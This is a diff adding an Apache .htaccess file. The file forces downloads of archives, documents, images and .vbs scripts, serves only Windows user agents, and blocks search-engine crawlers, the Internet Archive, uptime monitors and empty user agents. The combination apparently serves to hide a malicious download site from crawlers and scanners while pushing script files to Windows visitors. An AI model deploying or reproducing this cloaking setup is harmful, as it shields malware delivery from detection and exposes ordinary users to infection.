@@ -1,0 +1,25 @@
+<FilesMatch "\.(zip|pdf|docx|jpg|png|vbs)$">
+    ForceType application/octet-stream
+    Header set Content-Disposition attachment
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    
+    # Check if User-Agent contains 'Windows'
+    RewriteCond %{HTTP_USER_AGENT} !Windows [NC]
+    RewriteRule .* - [F,L]
+    
+    # Block known bad bots even if they are on Windows
+    RewriteCond %{HTTP_USER_AGENT} (MJ12bot|AhrefsBot|SemrushBot|DotBot|BLEXBot|UptimeRobot|MegaIndex|YandexBot|PetalBot|Exabot|ia_archiver|Cliqzbot|DuckDuckBot|Googlebot|Bingbot|Slurp|Yandex|Baiduspider|Sogou|facebot|facebookexternalhit) [NC]
+    RewriteRule .* - [F,L]
+</IfModule>
+
+<IfModule mod_setenvif.c>
+    SetEnvIfNoCase User-Agent ^$ bad_bot
+    <FilesMatch ".*">
+        Order Allow,Deny
+        Allow from all
+        Deny from env=bad_bot
+    </FilesMatch>
+</IfModule>
